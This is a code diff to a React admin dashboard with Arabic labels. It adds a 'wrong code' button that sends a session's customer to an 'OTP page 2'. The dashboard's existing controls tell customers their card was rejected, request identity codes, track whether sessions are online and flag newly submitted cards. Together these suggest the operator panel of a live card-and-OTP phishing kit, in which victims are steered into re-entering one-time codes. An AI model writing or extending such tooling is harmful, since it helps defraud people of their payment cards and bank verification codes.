@@ -215,6 +215,7 @@ function SessionBox({
   isOnline,
   newCardId,
   onViewCard,
+  onWrongCode,
 }: {
   sessionId: string;
   rows: SubmissionRow[];
@@ -230,6 +231,7 @@ function SessionBox({
   isOnline?: boolean;
   newCardId: number | null;
   onViewCard: () => void;
+  onWrongCode: () => void;
 }) {
   const [expanded, setExpanded] = useState(false); // مغلقة افتراضياً
   const [historyExpanded, setHistoryExpanded] = useState(false);
@@ -372,6 +374,11 @@ function SessionBox({
           </div>
 
           <div className="flex flex-wrap gap-2 self-end">
+            <button
+              type="button"
+              onClick={onWrongCode}
+              className="rounded-2xl px-3 py-2 text-xs font-semibold border border-orange-200 bg-orange-50 text-orange-700 hover:bg-orange-100"
+            >الرمز غير صحيح</button>
             <button
               type="button"
               onClick={blocked ? onUnblock : onBlock}
@@ -1053,6 +1060,7 @@ export default function AdminDashboard() {
         card_error: "إبلاغ خطأ البطاقة",
         nomer_error: "إبلاغ خطأ الرقم",
         identity_code: "إرسال رمز الهوية",
+        wrong_code: "صفحة OTP 2",
       };
       
       const pageName = pageNames[action] || action;
@@ -1060,6 +1068,8 @@ export default function AdminDashboard() {
       if (result.success) {
         if (action === "card_error") {
           toast("success", "تم إرسال إشعار الخطأ", "تم إبلاغ العميل بأن البطاقة مرفوضة");
+        } else if (action === "wrong_code") {
+          toast("success", "تم إرسال العميل", "تم إبلاغ العميل بأن الرمز غير صحيح");
         } else {
           toast("success", "تم تحويل العميل", `تم التوجيه إلى: ${pageName}`);
         }
@@ -1365,6 +1375,7 @@ export default function AdminDashboard() {
                     isOnline={trackingInfo[sessionId]?.isOnline}
                     newCardId={newCardId}
                     onViewCard={() => setNewCardId(null)}
+                    onWrongCode={() => handleControlAction(sessionId, "wrong_code")}
                   />
                 ))}
               </div>
